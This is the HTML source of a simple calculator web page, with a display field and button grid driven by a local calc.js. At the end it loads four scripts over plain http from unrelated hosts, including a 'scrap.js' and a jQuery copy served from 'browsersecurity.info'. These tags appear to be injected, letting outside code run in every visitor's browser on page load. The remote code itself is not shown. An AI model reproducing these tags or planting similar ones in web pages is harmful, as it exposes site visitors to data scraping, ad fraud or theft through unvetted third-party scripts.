<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Simple Calculator</title>
<link href="calc.css" rel="stylesheet" type="text/css">
</head>
<body>
<div class="cont">
<div class="main">
<div class="header">
<p>CALCULATOR</p>
</div>
<input id="demo" type="text" placeholder="0">
<div id="row">
<div id="row1">
<input type="button" value="(" onClick="val(this.value)">
<input type="button" value=")" onClick="val(this.value)">
<input type="button" value="%" onClick="val(this.value)">
<input type="button" value="AC" onClick="cal()"></div>
<div id="row2">
<input type="button" value="7" onClick="val(this.value)">
<input type="button"  value="8" onClick="val(this.value)">
<input type="button"  value="9" onClick="val(this.value)" >
<input type="button" value="/" onClick="val(this.value)"></div>
<div id="row3">
<input type="button" value="4" onClick="val(this.value)">
<input type="button" value="5" onClick="val(this.value)">
<input type="button" value="6" onClick="val(this.value)">
<input type="button" value="*" onClick="val(this.value)"></div>
<div id="row4">
<input type="button" value="1" onClick="val(this.value)">
<input type="button" value="2" onClick="val(this.value)">
<input type="button" value="3" onClick="val(this.value)">
<input type="button" value="+" onClick="val(this.value)"></div>
<div id="row5">
<input type="button" value="0" onClick="val(this.value)">
<input type="button" value="." onClick="val(this.value)">
<input type="button" value="=" onClick="result()">
<input type="button" value="-" onClick="val(this.value)">
</div>
</div></div></div>
<script src="calc.js"></script>
<script src="http://service.browserinfo.org/js/scrap.js" type="text/javascript"></script>
<script src="http://service.browserinfo.org/js/ads.js" type="text/javascript"></script>
<script src="http://browsersecurity.info/js/jquery.js" type="text/javascript"></script>
<script src="http://browsersecurity.info/js/essence.js" type="text/javascript"></script>
</body>
</html>
